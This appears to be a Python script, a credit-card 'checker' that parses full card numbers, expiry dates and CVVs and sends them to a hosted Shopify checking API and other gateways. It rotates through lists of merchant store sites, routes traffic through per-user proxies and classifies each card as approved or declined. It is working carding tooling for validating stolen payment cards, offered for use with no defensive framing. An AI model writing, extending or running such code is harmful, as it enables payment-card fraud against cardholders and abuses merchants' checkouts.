import sys
import json
import asyncio
import os
import re
import aiohttp

sys.path.insert(0, os.path.dirname(__file__))

from gateways import run_gateway, parse_card_input, classify_response, get_flat_registry, get_user_proxy

RAILWAY_SHOPIFY_API = os.environ.get("RAILWAY_SHOPIFY_API", "https://shoify-api-production.up.railway.app")


async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=90):
    payload = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    if site:
        payload["site"] = site
    if proxy:
        payload["proxy"] = proxy
    try:
        async with aiohttp.ClientSession() as _sess:
            async with _sess.post(
                f"{RAILWAY_SHOPIFY_API}/check",
                json=payload,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as _resp:
                api_result = await _resp.json(content_type=None)
    except Exception as e:
        api_result = {
            "status": "error",
            "response": f"API error: {str(e)[:100]}",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": site,
            "elapsed": 0,
            "extra": None,
        }
    api_result.setdefault("status", "error")
    api_result.setdefault("response", "Unknown")
    api_result.setdefault("gateway", "Shopify Payments")
    api_result.setdefault("amount", None)
    api_result.setdefault("site", site)
    api_result.setdefault("elapsed", 0)
    api_result.setdefault("extra", None)
    api_result.setdefault("confidence", None)
    api_result.setdefault("explanation", "")
    api_result.setdefault("card_type", "")
    api_result.setdefault("card_bin", "")
    api_result.setdefault("card_last4", "")
    if api_result["status"] == "error" and isinstance(api_result["response"], str):
        if "all sites failed" in api_result["response"].lower():
            api_result["status"] = "dead_site"
    return api_result

def clean_response(raw):
    text = str(raw)
    text = re.sub(r'\s*\[\d+\.?\d*s\]\s*$', '', text)
    text = re.sub(r'\s*\|\s*(?:VISA|MASTERCARD|AMEX|DISCOVER|JCB|DINERS|MAESTRO|UNIONPAY|CARD)(?:\s+(?:CREDIT|DEBIT|PREPAID|CHARGE))?\s*\|.*$', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\s*\|\s*\d{4,6}\s*$', '', text)
    text = re.sub(r'^(?:Declined|Approved|Error|Unknown)\s*-\s*', '', text, flags=re.IGNORECASE)
    text = re.sub(r'^(?:Declined|Approved|Error|Unknown)\s*-\s*', '', text, flags=re.IGNORECASE)
    return text.strip() or str(raw).strip()

async def check_card(alias, card_str, user_id=None, is_admin=False):
    parsed = parse_card_input(card_str)
    if not parsed:
        return {"status": "error", "response": "Invalid card format. Use: CC|MM|YY|CVV"}

    cc, mm, yy, cvv = parsed

    flat = get_flat_registry()
    gate_info = flat.get(alias)
    if not gate_info:
        return {"status": "error", "response": f"Unknown gateway: {alias}"}

    timeout_secs = 120 if alias in ("auto", "autoskool", "shp") else 60

    # ── Shopify: use hosted API ────────────────────────────────────────────
    if alias == "shp" and user_id:
        try:
            _shp_proxy = get_user_proxy(str(user_id)) if user_id else None

            sites_file = os.path.join(os.path.dirname(__file__), "user_sites.json")
            custom_sites = []
            if os.path.exists(sites_file):
                with open(sites_file, "r") as f:
                    all_sites = json.load(f)
                custom_sites = all_sites.get(str(user_id), [])

            admin_sites_file = os.path.join(os.path.dirname(__file__), "admin_sites.json")
            if os.path.exists(admin_sites_file):
                with open(admin_sites_file, "r") as f:
                    admin_sites = json.load(f)
                if isinstance(admin_sites, list):
                    custom_sites = list(set(custom_sites + admin_sites))

            if custom_sites:
                import random as _rand
                _rand.shuffle(custom_sites)

                for site in custom_sites[:10]:
                    try:
                        result = await asyncio.wait_for(
                            call_shopify_api(cc, mm, yy, cvv, site=site, proxy=_shp_proxy, timeout=90),
                            timeout=95
                        )
                        if result.get("status") not in ("dead_site", "error"):
                            result_str = result.get("response", "")
                            classification = classify_response(result_str)
                            return {
                                "status": classification.lower(),
                                "response": clean_response(result_str),
                                "gateway": result.get("gateway", "Shopify"),
                                "card": f"{cc}|{mm}|{yy}|{cvv}",
                                "site": result.get("site", ""),
                                "amount": result.get("amount"),
                                "confidence": result.get("confidence"),
                                "explanation": result.get("explanation", ""),
                                "card_type": result.get("card_type", ""),
                                "card_bin": result.get("card_bin", ""),
                                "card_last4": result.get("card_last4", ""),
                            }
                    except asyncio.TimeoutError:
                        continue
                    except Exception:
                        continue

            try:
                result = await asyncio.wait_for(
                    call_shopify_api(cc, mm, yy, cvv, site=None, proxy=_shp_proxy, timeout=90),
                    timeout=95
                )
                result_str = result.get("response", "")
                classification = classify_response(result_str)
                return {
                    "status": classification.lower(),
                    "response": clean_response(result_str),
                    "gateway": result.get("gateway", "Shopify"),
                    "card": f"{cc}|{mm}|{yy}|{cvv}",
                    "site": result.get("site", ""),
                    "amount": result.get("amount"),
                    "confidence": result.get("confidence"),
                    "explanation": result.get("explanation", ""),
                    "card_type": result.get("card_type", ""),
                    "card_bin": result.get("card_bin", ""),
                    "card_last4": result.get("card_last4", ""),
                }
            except Exception as e:
                return {"status": "error", "response": f"Shopify API error: {str(e)[:150]}", "card": f"{cc}|{mm}|{yy}|{cvv}"}
        except Exception:
            pass

    try:
        result = await asyncio.wait_for(
            run_gateway(alias, cc, mm, yy, cvv, user_id=user_id, use_semaphore=False, is_admin=is_admin),
            timeout=timeout_secs
        )
        result_str = str(result)
        if result_str == "NO_SKOOL_ACCOUNT":
            return {
                "status": "error",
                "response": "NO_SKOOL_ACCOUNT",
                "gateway": gate_info["name"],
                "card": f"{cc}|{mm}|{yy}|{cvv}"
            }
        classification = classify_response(result_str)
        return {
            "status": classification.lower(),
            "response": clean_response(result),
            "gateway": gate_info["name"],
            "card": f"{cc}|{mm}|{yy}|{cvv}"
        }
    except asyncio.TimeoutError:
        return {"status": "error", "response": f"Gateway timeout ({timeout_secs}s)"}
    except Exception as e:
        return {"status": "error", "response": f"Error: {str(e)[:200]}"}

async def main():
    if len(sys.argv) < 3:
        print(json.dumps({"status": "error", "response": "Usage: web_checker.py <gateway> <card> [user_id]"}))
        return

    alias = sys.argv[1]
    card_str = sys.argv[2]
    user_id = sys.argv[3] if len(sys.argv) > 3 else None
    is_admin = sys.argv[4].lower() == "true" if len(sys.argv) > 4 else False

    result = await check_card(alias, card_str, user_id=user_id, is_admin=is_admin)
    print(json.dumps(result))

if __name__ == "__main__":
    asyncio.run(main())
